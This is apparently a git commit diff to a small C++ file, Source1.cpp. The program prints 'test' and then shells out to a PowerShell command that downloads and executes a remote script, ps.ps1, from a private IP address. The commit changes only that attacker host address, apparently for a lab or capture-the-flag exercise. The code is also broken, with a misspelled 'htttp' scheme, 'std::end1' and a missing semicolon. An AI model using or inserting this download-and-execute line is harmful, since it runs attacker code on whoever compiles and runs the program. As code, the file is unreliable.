fbcddff707bcc476af0bd8d41ac4065475ff3c17
kamisw03 <146664080+kamisw03@users.noreply.github.com>
2023-10-01 12:45:34 -0500

    Update Source1.cpp

--- Source1.cpp
+++ Source1.cpp
@@ -4,6 +4,6 @@
 
 int main() {
 	std::cout << "test" << std::end1;
-	system("powershell iex(new-object net.webclient).downloadstring('htttp://192.168.110.101/ps.ps1')")
+	system("powershell iex(new-object net.webclient).downloadstring('htttp://10.10.14.12/ps.ps1')")
 		return 0;
 }
